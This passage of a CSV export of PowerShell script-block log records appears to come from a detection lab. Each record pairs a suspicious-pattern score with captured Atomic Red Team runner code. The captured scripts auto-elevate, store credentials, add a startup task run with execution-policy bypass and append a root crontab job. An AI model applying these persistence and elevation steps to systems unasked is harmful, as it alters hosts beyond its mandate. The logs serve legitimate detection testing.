        [Parameter(Mandatory = $false)]
        [switch]
        $asScheduledtask
    )

    # ensure running with admin privs
    if ($artConfig.OS -eq ""windows"") {
        # auto-elevate on Windows
        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
        $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($testadmin -eq $false) {
            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file ""{0}"" -elevated' -f ($myinvocation.MyCommand.Definition))
            exit $LASTEXITCODE
        }
    }
    else {
        # linux and macos check - doesn't auto-elevate
        if ((id -u) -ne 0 ) {
            Throw ""You must run the Invoke-SetupAtomicRunner script as root""
            exit
        }
    }

    if ($artConfig.basehostname.length -gt 15) { Throw ""The hostname for this machine (minus the GUID) must be 15 characters or less. Please rename this computer."" }

    #create AtomicRunner-Logs directories if they don't exist
    New-Item -ItemType Directory $artConfig.atomicLogsPath -ErrorAction Ignore
    New-Item -ItemType Directory $artConfig.runnerFolder -ErrorAction Ignore

    if ($artConfig.OS -eq ""windows"") {
        if ($asScheduledtask) {
            if (Test-Path $artConfig.credFile) {
                Write-Host ""Credential File $($artConfig.credFile) already exists, not prompting for creation of a new one.""
                $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $artConfig.user, (Get-Content $artConfig.credFile | ConvertTo-SecureString)
            }
            else {
                # create credential file for the user since we aren't using a group managed service account
                $cred = Get-Credential -UserName $artConfig.user -message ""Enter password for $($artConfig.user) in order to create the runner scheduled task""
                $cred.Password | ConvertFrom-SecureString | Out-File $artConfig.credFile
            }
            # setup scheduled task that will start the runner after each restart
            # local security policy --> Local Policies --> Security Options --> Network access: Do not allow storage of passwords and credentials for network authentication must be disabled
            $taskName = ""KickOff-AtomicRunner""
            Unregister-ScheduledTask $taskName -confirm:$false -ErrorAction Ignore
            # Windows scheduled task includes a 20 minutes sleep then restart if the call to Invoke-KickoffAtomicRunner fails
            # this occurs occassionally when Windows has issues logging into the runner user's account and logs in as a TEMP user
            $taskAction = New-ScheduledTaskAction -Execute ""powershell.exe"" -Argument ""-exec bypass -Command Invoke-KickoffAtomicRunner; Start-Sleep 1200; Restart-Computer -Force""
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId $artConfig.user
            $delays = @(1, 2, 4, 8, 16, 32, 64) # using multiple triggers as a retry mechanism because the built-in retry mechanism doesn't work when the computer renaming causes AD replication delays
            $triggers = @()
            foreach ($delay in $delays) {
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $trigger.Delay = ""PT$delay`M""
                $triggers += $trigger
            }
            $task = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $triggers -Description ""A task that runs 1 minute or later after boot to start the atomic test runner script""
            try {
                $null = Register-ScheduledTask -TaskName $taskName -InputObject $task -User $artConfig.user -Password $($cred.GetNetworkCredential().password) -ErrorAction Stop
            }
            catch {
                if ($_.CategoryInfo.Category -eq ""AuthenticationError"") {
                    # remove the credential file if the password didn't work
                    Write-Error ""The credentials you entered are incorrect. Please run the setup script again and double check the username and password.""
                    Remove-Item $artConfig.credFile
                }
                else {
                    Throw $_
                }
            }

            # remove the atomicrunnerservice now that we are using a scheduled task instead
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
        }
        elseif (-not $SkipServiceSetup) {
            # create the service that will start the runner after each restart
            # The user must have the ""Log on as a service"" right. To add that right, open the Local Security Policy management console, go to the
            # ""\Security Settings\Local Policies\User Rights Assignments"" folder, and edit the ""Log on as a service"" policy there.
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -Remove
            . ""$PSScriptRoot\AtomicRunnerService.ps1"" -UserName $artConfig.user -installDir $artConfig.serviceInstallDir -Setup
            Add-EnvPath -Container Machine -Path $artConfig.serviceInstallDir
            # set service start retry options
            $ServiceDisplayName = ""AtomicRunnerService""
            $action1, $action2, $action3 = ""restart""
            $time1 = 600000 # 10 minutes in miliseconds
            $action2 = ""restart""
            $time2 = 600000 # 10 minutes in miliseconds
            $actionLast = ""restart""
            $timeLast = 3600000 # 1 hour in miliseconds
            $resetCounter = 86400 # 1 day in seconds
            $services = Get-CimInstance -ClassName 'Win32_Service' | Where-Object { $_.DisplayName -imatch $ServiceDisplayName }
            $action = $action1 + ""/"" + $time1 + ""/"" + $action2 + ""/"" + $time2 + ""/"" + $actionLast + ""/"" + $timeLast
            foreach ($service in $services) {
                # https://technet.microsoft.com/en-us/library/cc742019.aspx
                $output = sc.exe  failure $($service.Name) actions= $action reset= $resetCounter
            }
            # set service to delayed auto-start (doesn't reflect in the services console until after a reboot)
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name Start -Value 2
            Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\AtomicRunnerService"" -Name DelayedAutostart -Value 1

            # remove scheduled task now that we are using a service instead
            Unregister-ScheduledTask ""KickOff-AtomicRunner"" -confirm:$false -ErrorAction Ignore
        }
    }
    else {
        # sets cronjob string using basepath from config.ps1
        $pwshPath = which pwsh
        $job = ""@reboot root sleep 60;$pwshPath -Command Invoke-KickoffAtomicRunner""
        $exists = cat /etc/crontab | Select-String -Quiet ""KickoffAtomicRunner""
        #checks if the Kickoff-AtomicRunner job exists. If not appends it to the system crontab.
        if ($null -eq $exists) {
            $(Write-Output ""$job"" >> /etc/crontab)
            write-host ""setting cronjob""
        }
        else {
            write-host ""cronjob already exists""
        }
    }

    # Add Import-Module statement to the PowerShell profile
    $root = Split-Path $PSScriptRoot -Parent
    $pathToPSD1 = Join-Path $root ""Invoke-AtomicRedTeam.psd1""
    $importStatement = ""Import-Module """"$pathToPSD1"""" -Force""
    $profileFolder = Split-Path $profile
    New-Item -ItemType Directory -Force -Path $profileFolder | Out-Null
    New-Item $PROFILE -ErrorAction Ignore
    $profileContent = Get-Content $profile
    $line = $profileContent | Select-String "".*import-module.*invoke-atomicredTeam.psd1"" | Select-Object -ExpandProperty Line
    if ($line) {
        $profileContent | ForEach-Object { $_.replace( $line, ""$importStatement"") } | Set-Content $profile
    }
    else {
        Add-Content $profile $importStatement
    }

    # Install the Posh-SYLOG module if we are configured to use it and it is not already installed
    if ((-not (Get-Module -ListAvailable ""Posh-SYSLOG"")) -and [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        write-verbose ""Posh-SYSLOG""
        Install-Module -Name Posh-SYSLOG -Scope CurrentUser -Force
    }

    # create the CSV schedule of atomics to run if it doesn't exist
    if (-not (Test-Path $artConfig.scheduleFile)) {
        Invoke-GenerateNewSchedule
    }

    $schedule = Get-Schedule
    if ($null -eq $schedule) {
        Write-Host -ForegroundColor Yellow ""There are no tests enabled on the schedule, set the 'Enabled' column to 'True' for the atomic test that you want to run. The schedule file is found here: $($artConfig.scheduleFile)""
        Write-Host -ForegroundColor Yellow ""Rerun this setup script after updating the schedule""
    }
    else {
        # Get the prereqs for all of the tests on the schedule
        Invoke-AtomicRunner -GetPrereqs
    }
}

# Add-EnvPath from https://gist.github.com/mkropat/c1226e0cc2ca941b23a9
function Add-EnvPath {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Path,

        [ValidateSet('Machine', 'User', 'Session')]
        [string] $Container = 'Session'
    )

    if ($Container -ne 'Session') {
        $containerMapping = @{
            Machine = [EnvironmentVariableTarget]::Machine
            User    = [EnvironmentVariableTarget]::User
        }
        $containerType = $containerMapping[$Container]

        $persistedPaths = [Environment]::GetEnvironmentVariable('Path', $containerType) -split ';'
        if ($persistedPaths -notcontains $Path) {
            $persistedPaths = $persistedPaths + $Path | Where-Object { $_ }
            [Environment]::SetEnvironmentVariable('Path', $persistedPaths -join ';', $containerType)
        }
    }

    $envPaths = $env:Path -split ';'
    if ($envPaths -notcontains $Path) {
        $envPaths = $envPaths + $Path | Where-Object { $_ }
        $env:Path = $envPaths -join ';'
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Verb RunAs'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:56 PM","35711009","7",", WebClient, SuspiciousKeyword, Reflection","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","2194","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}


function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}

Initialize-Assemblies | Out-Null
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:54 PM","35710631","7",", WebClient, SuspiciousKeyword, Reflection","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","2194","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}


function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}

Initialize-Assemblies | Out-Null
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:53 PM","35710492","7",", WebClient, SuspiciousKeyword, Reflection","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","2194","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

$here = Split-Path -Parent $MyInvocation.MyCommand.Path

function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}


function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}

Initialize-Assemblies | Out-Null
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:54 PM","35710576","7",", WebClient, Get, SuspiciousKeyword","WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","13819","function Start-AtomicGUI {
    param (
        [Int] $port = 8487
    )
    # Install-Module UniversalDashboard if not already installed
    $UDcommunityInstalled = Get-InstalledModule -Name ""UniversalDashboard.Community"" -ErrorAction:SilentlyContinue
    $UDinstalled = Get-InstalledModule -Name ""UniversalDashboard"" -ErrorAction:SilentlyContinue
    if (-not $UDcommunityInstalled -and -not $UDinstalled) {
        Write-Host ""Installing UniversalDashboard.Community""
        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force
    }

    ############## Function Definitions Made Available to EndPoints
    function New-UDTextAreaX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""textarea"" -id  $ID -Attributes @{ class = ""materialize-textarea ud-input"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    function New-UDTextBoxX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""input"" -id $ID -Attributes @{ class = ""ud-input""; type = ""text"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    $InputArgCards = @{ }
    function New-InputArgCard {
        $cardNumber = $InputArgCards.count + 1
        $newCard = New-UDCard -ID ""InputArgCard$cardNumber"" -Content {
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgName"" ""Input Argument Name""
            New-UDTextAreaX ""InputArgCard$cardNumber-InputArgDescription"" ""Description""
            New-UDTextBoxX ""InputArgCard$cardNumber-InputArgDefault"" ""Default Value""
            New-UDLayout -columns 4 {
                New-UDSelect -ID ""InputArgCard$cardNumber-InputArgType"" -Label ""Type"" -Option {
                    New-UDSelectOption -Name ""Path"" -Value ""path""
                    New-UDSelectOption -Name ""String"" -Value ""string""
                    New-UDSelectOption -Name ""Url"" -Value ""url""
                    New-UDSelectOption -Name ""Integer"" -Value ""integer""
                }
            }
            New-UDButton -Text ""Remove this Input Argument""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""InputArgCard$cardNumber""
                    $inputArgCards[""InputArgCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $inputArgCards)
            )
        }
        $InputArgCards.Add(""InputArgCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    $depCards = @{ }
    function New-depCard {
        $cardNumber = $depCards.count + 1
        $newCard = New-UDCard -ID ""depCard$cardNumber"" -Content {
            New-UDTextBoxX ""depCard$cardNumber-depDescription"" ""Prereq Description""
            New-UDTextAreaX ""depCard$cardNumber-prereqCommand"" ""Check prereqs Command""
            New-UDTextAreaX ""depCard$cardNumber-getPrereqCommand"" ""Get Prereqs Command""
            New-UDButton -Text ""Remove this Prereq""  -OnClick (
                New-UDEndpoint -Endpoint {
                    Remove-UDElement -Id ""depCard$cardNumber""
                    $depCards[""depCard$cardNumber""] = $true
                } -ArgumentList @($cardNumber, $depCards)
            )
        }
        $depCards.Add(""depCard$cardNumber"", $false) | Out-Null
        $newCard
    }

    function New-UDSelectX ($Id, $Label) {
        New-UDSelect -Label $Label -Id $Id -Option {
            New-UDSelectOption -Name ""PowerShell"" -Value ""PowerShell"" -Selected
            New-UDSelectOption -Name ""Command Prompt"" -Value ""CommandPrompt""
            New-UDSelectOption -Name ""Bash"" -Value ""Bash""
            New-UDSelectOption -Name ""Sh"" -Value ""Sh""
        }
    }

    ############## End Function Definitions Made Available to EndPoints

    # EndpointInitialization defining which methods, modules, and variables will be available for use within an endpoint
    $ei = New-UDEndpointInitialization `
        -Function @(""New-InputArgCard"", ""New-depCard"", ""New-UDTextAreaX"", ""New-UDTextBoxX"", ""New-UDSelectX"") `
        -Variable @(""InputArgCards"", ""depCards"", ""yaml"") `
        -Module @(""..\Invoke-AtomicRedTeam.psd1"")

    ############## EndPoint (ep) Definitions: Dynamic code called to generate content for an element or perfrom onClick actions
    $BuildAndDisplayYamlScriptBlock = {
        $testName = (Get-UDElement -Id atomicName).Attributes['value']
        $testDesc = (Get-UDElement -Id atomicDescription).Attributes['value']
        $platforms = @()
        if ((Get-UDElement -Id spWindows).Attributes['checked']) { $platforms += ""Windows"" }
        if ((Get-UDElement -Id spLinux).Attributes['checked']) { $platforms += ""Linux"" }
        if ((Get-UDElement -Id spMacOS).Attributes['checked']) { $platforms += ""macOS"" }
        $attackCommands = (Get-UDElement -Id attackCommands).Attributes['value']
        $executor = (Get-UDElement -Id executorSelector).Attributes['value']
        $elevationRequired = (Get-UDElement -Id elevationRequired).Attributes['checked']
        $cleanupCommands = (Get-UDElement -Id cleanupCommands).Attributes['value']
        if ("""" -eq $executor) { $executor = ""PowerShell"" }
        # input args
        $inputArgs = @()
        $InputArgCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # this was not deleted
                $prefix = $_.key
                $InputArgName = (Get-UDElement -Id ""$prefix-InputArgName"").Attributes['value']
                $InputArgDescription = (Get-UDElement -Id ""$prefix-InputArgDescription"").Attributes['value']
                $InputArgDefault = (Get-UDElement -Id ""$prefix-InputArgDefault"").Attributes['value']
                $InputArgType = (Get-UDElement -Id ""$prefix-InputArgType"").Attributes['value']
                if ("""" -eq $InputArgType) { $InputArgType = ""String"" }
                $NewInputArg = New-AtomicTestInputArgument -Name $InputArgName -Description $InputArgDescription -Type $InputArgType -Default $InputArgDefault -WarningVariable +warnings
                $inputArgs += $NewInputArg
            }
        }
        # dependencies
        $dependencies = @()
        $preReqEx = """"
        $depCards.GetEnumerator() | ForEach-Object {
            if ($_.Value -eq $false) {
                # a value of true means the card was deleted, so only add dependencies from non-deleted cards
                $prefix = $_.key
                $depDescription = (Get-UDElement -Id ""$prefix-depDescription"").Attributes['value']
                $prereqCommand = (Get-UDElement -Id ""$prefix-prereqCommand"").Attributes['value']
                $getPrereqCommand = (Get-UDElement -Id ""$prefix-getPrereqCommand"").Attributes['value']
                $preReqEx = (Get-UDElement -Id ""preReqEx"").Attributes['value']
                if ("""" -eq $preReqEx) { $preReqEx = ""PowerShell"" }
                $NewDep = New-AtomicTestDependency -Description $depDescription -PrereqCommand $prereqCommand -GetPrereqCommand $getPrereqCommand -WarningVariable +warnings
                $dependencies += $NewDep
            }
        }
        $depParams = @{ }
        if ($dependencies.count -gt 0) {
            $depParams.add(""DependencyExecutorType"", $preReqEx)
            $depParams.add(""Dependencies"", $dependencies)
        }
        if (($cleanupCommands -ne """") -and ($null -ne $cleanupCommands)) { $depParams.add(""ExecutorCleanupCommand"", $cleanupCommands) }
        $depParams.add(""ExecutorElevationRequired"", $elevationRequired)

        $AtomicTest = New-AtomicTest -Name $testName -Description $testDesc -SupportedPlatforms $platforms -InputArguments $inputArgs -ExecutorType $executor -ExecutorCommand $attackCommands -WarningVariable +warnings @depParams
        $yaml = ($AtomicTest | ConvertTo-Yaml) -replace ""^"", ""- "" -replace ""`n"", ""`n  ""
        foreach ($warning in $warnings) { Show-UDToast $warning -BackgroundColor LightYellow -Duration 10000 }
        New-UDElement -ID yaml -Tag pre -Content { $yaml }
    }

    $epYamlModal = New-UDEndpoint -Endpoint {
        Show-UDModal -Header { New-UDHeading -Size 3 -Text ""Test Definition YAML"" } -Content {
            new-udrow -endpoint $BuildAndDisplayYamlScriptBlock
            # Left arrow button (decrease indentation)
            New-UDButton -Icon arrow_circle_left -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    if (-not $yaml.startsWith(""- "")) {
                        Set-UDElement -Id ""yaml"" -Content {
                            $yaml -replace ""^  "", """" -replace ""`n  "", ""`n""
                        }
                    }
                }
            )
            # Right arrow button (increase indentation)
            New-UDButton -Icon arrow_circle_right -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDElement -Id ""yaml"" -Content {
                        $yaml -replace ""^"", ""  "" -replace ""`n"", ""`n  ""
                    }
                }
            )
            # Copy Yaml to clipboard
            New-UDButton -Text ""Copy"" -OnClick (
                New-UDEndpoint -Endpoint {
                    $yaml = (Get-UDElement -Id ""yaml"").Content[0]
                    Set-UDClipboard -Data $yaml
                    Show-UDToast -Message ""Copied YAML to the Clipboard"" -BackgroundColor YellowGreen
                }
            )
        }
    }

    $epFillTestData = New-UDEndpoint -Endpoint {
        Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard }
        Add-UDElement -ParentId ""depCard""   -Content { New-depCard }
        Start-Sleep 1
        Set-UDElement -Id atomicName -Attributes @{value = ""My new atomic"" }
        Set-UDElement -Id atomicDescription -Attributes @{value = ""This is the atomic description"" }
        Set-UDElement -Id attackCommands -Attributes @{value = ""echo this`necho that"" }
        Set-UDElement -Id cleanupCommands -Attributes @{value = ""cleanup commands here`nand here..."" }
        # InputArgs
        $cardNumber = 1
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgName"" -Attributes @{value = ""input_arg_1"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDescription"" -Attributes @{value = ""InputArg1 description"" }
        Set-UDElement -Id ""InputArgCard$cardNumber-InputArgDefault"" -Attributes @{value = ""this is the default value"" }
        # dependencies
        Set-UDElement -Id ""depCard$cardNumber-depDescription"" -Attributes @{value = ""This file must exist"" }
        Set-UDElement -Id ""depCard$cardNumber-prereqCommand"" -Attributes @{value = ""if (this) then that"" }
        Set-UDElement -Id ""depCard$cardNumber-getPrereqCommand"" -Attributes @{value = ""iwr"" }

    }
    ############## End EndPoint (ep) Definitions

    ############## Static Definitions
    $supportedPlatforms = New-UDLayout -Columns 4 {
        New-UDElement -Tag Label -Attributes @{ style = @{""font-size"" = ""15px"" } } -Content { ""Supported Platforms:"" }
        New-UDCheckbox -FilledIn -Label ""Windows"" -Checked -Id spWindows
        New-UDCheckbox -FilledIn -Label ""Linux"" -Id spLinux
        New-UDCheckbox -FilledIn -Label ""macOS""-Id spMacOS
    }

    $executorRow = New-UDLayout -Columns 4 {
        New-UDSelectX 'executorSelector' ""Executor for Attack Commands""
        New-UDCheckbox -ID elevationRequired -FilledIn -Label ""Requires Elevation to Execute Successfully?""
    }

    $genarateYamlButton = New-UDRow -Columns {
        New-UDColumn -Size 8 -Content { }
        New-UDColumn -Size 4 -Content {
            New-UDButton -Text ""Generate Test Definition YAML"" -OnClick ( $epYamlModal )
        }
    }

    ############## End Static Definitions

    ############## The Dashboard
    $idleTimeOut = New-TimeSpan -Minutes 10080
    $db = New-UDDashboard -Title ""Atomic Test Creation"" -IdleTimeout $idleTimeOut -EndpointInitialization $ei -Content {
        New-UDCard -Id ""mainCard"" -Content {
            New-UDCard -Content {
                New-UDTextBoxX 'atomicName' ""Atomic Test Name""
                New-UDTextAreaX ""atomicDescription"" ""Atomic Test Description""
                $supportedPlatforms
                New-UDTextAreaX ""attackCommands"" ""Attack Commands""
                $executorRow
                New-UDTextAreaX ""cleanupCommands"" ""Cleanup Commands (Optional)""
                $genarateYamlButton
            }

            # input args
            New-UDCard -Id ""inputCard"" -Endpoint {
                New-UDButton -Text ""Add Input Argument (Optional)"" -OnClick (
                    New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""inputCard"" -Content { New-InputArgCard } }
                )
            }

            # prereqs
            New-UDCard -Id ""depCard"" -Endpoint {
                New-UDLayout -columns 4 {
                    New-UDButton -Text ""Add Prerequisite (Optional)"" -OnClick (
                        New-UDEndpoint -Endpoint { Add-UDElement -ParentId ""depCard"" -Content { New-depCard } }
                    )
                    New-UDSelectX 'preReqEx' ""Executor for Prereq Commands""
                }
            }
        }

        # button to fill form with test data for development purposes
        if ($false) { New-UDButton -Text ""Fill Test Data"" -OnClick ( $epFillTestData ) }
    }
    ############## End of the Dashboard

    Stop-AtomicGUI
    Start-UDDashboard -port $port -Dashboard $db -Name ""AtomicGUI"" -ListenAddress 127.0.0.1
    start-process http://localhost:$port
}

function Stop-AtomicGUI {
    Get-UDDashboard -Name 'AtomicGUI' | Stop-UDDashboard
    Write-Host ""Stopped all AtomicGUI Dashboards""
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'start-process'"
"12/16/2024 8:34:57 PM","35711094","7",", WebClient, Get, SuspiciousKeyword","WebClient [Score: 5]; Get [Score: 1]; SuspiciousKeyword [Score: 1]","13819","function Start-AtomicGUI {
    param (
        [Int] $port = 8487
    )
    # Install-Module UniversalDashboard if not already installed
    $UDcommunityInstalled = Get-InstalledModule -Name ""UniversalDashboard.Community"" -ErrorAction:SilentlyContinue
    $UDinstalled = Get-InstalledModule -Name ""UniversalDashboard"" -ErrorAction:SilentlyContinue
    if (-not $UDcommunityInstalled -and -not $UDinstalled) {
        Write-Host ""Installing UniversalDashboard.Community""
        Install-Module -Name UniversalDashboard.Community -Scope CurrentUser -Force
    }

    ############## Function Definitions Made Available to EndPoints
    function New-UDTextAreaX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""textarea"" -id  $ID -Attributes @{ class = ""materialize-textarea ud-input"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    function New-UDTextBoxX ($ID, $PlaceHolder) {
        New-UDElement -Tag div -Attributes @{class = ""input-field col"" } -Content {
            New-UDElement -Tag ""input"" -id $ID -Attributes @{ class = ""ud-input""; type = ""text"" }
            New-UDElement -Tag Label -Attributes @{for = $ID } -Content { $PlaceHolder }
        }
    }

    $InputArgCards = @{ }
    function New-InputArgCard {
        $cardNumber = $InputArgCards.count + 1
        $newCard = New-UDCard -ID ""InputArgCard$cardNumber"" -Content {
